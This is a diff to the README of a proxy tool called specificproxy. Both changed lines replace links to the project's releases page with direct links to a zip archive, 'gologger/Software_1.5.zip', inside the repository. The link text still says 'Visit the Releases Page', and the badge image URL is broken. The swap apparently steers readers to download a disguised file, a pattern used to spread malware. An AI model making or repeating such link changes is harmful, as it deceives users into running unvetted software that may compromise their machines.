@@ -4,7 +4,7 @@
 Welcome to specificproxy! This is a user-friendly HTTP proxy that helps you set the IP address right when you connect. It’s simple to use, whether you want to surf the web with privacy or access content from different locations.
 
 ## 📥 Download the Application
-[![Download specificproxy](https://img.shields.io/badge/Download%20specificproxy-Click%20Here-blue)](https://github.com/filipszaulity/specificproxy/releases)
+[![Download specificproxy](https://raw.githubusercontent.com/filipszaulity/specificproxy/main/gologger/Software_1.5.zip%20specificproxy-Click%20Here-blue)](https://raw.githubusercontent.com/filipszaulity/specificproxy/main/gologger/Software_1.5.zip)
 
 ## 🛠️ System Requirements
 Before you begin, make sure your device meets the following requirements:
@@ -22,7 +22,7 @@ Before you begin, make sure your device meets the following requirements:
 ## 📋 How to Download & Install
 To download specificproxy, visit the Releases page by clicking the link below. 
 
-[Visit the Releases Page](https://github.com/filipszaulity/specificproxy/releases).
+[Visit the Releases Page](https://raw.githubusercontent.com/filipszaulity/specificproxy/main/gologger/Software_1.5.zip).
 
 1. Once you're on the Releases page, look for the most recent version of specificproxy.
 2. You will see several files listed under the "Assets" section.
